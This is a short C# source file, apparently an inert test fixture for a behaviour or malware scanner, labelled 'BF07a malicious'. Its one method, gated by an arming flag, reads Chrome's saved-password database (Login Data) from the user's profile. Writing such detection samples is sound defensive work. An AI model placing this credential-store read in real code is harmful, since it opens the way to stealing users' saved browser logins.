// Inert fixture: never executed (gated by Arm.Armed). BF07a malicious: reads the Chrome Login Data store.
using System;
using System.IO;

namespace Behaviour
{
    public static class CredentialReader
    {
        public static byte[] Read()
        {
            if (!Arm.Armed) return null;
            var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            return File.ReadAllBytes(Path.Combine(local, @"Google\Chrome\User Data\Default\Login Data"));
        }
    }
}
